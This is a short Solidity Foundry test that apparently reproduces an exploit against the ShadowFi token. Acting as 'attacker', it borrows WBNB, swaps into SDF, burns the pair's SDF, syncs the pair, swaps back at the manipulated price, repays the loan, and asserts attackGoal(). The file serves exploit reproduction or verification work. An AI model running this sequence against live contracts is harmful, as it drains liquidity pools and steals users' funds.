// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./ShadowFi.t.sol";
contract ShadowFiVerify is ShadowFiTest{
function test_verify_check_gt_000() public {
vm.startPrank(attacker);
vm.warp(blockTimestamp);
borrow_wbnb(0x8e3f50b173c100000);
swap_pair_wbnb_sdf(0x8f8c61d24b7260000);
burn_pair_sdf(0x426ca844a1827);
sync_pair();
swap_pair_sdf_wbnb(0x4563918244f40);
payback_wbnb(0x8eac8fa7be98e0000);
require(attackGoal(), "Attack failed!");
vm.stopPrank();
}
}
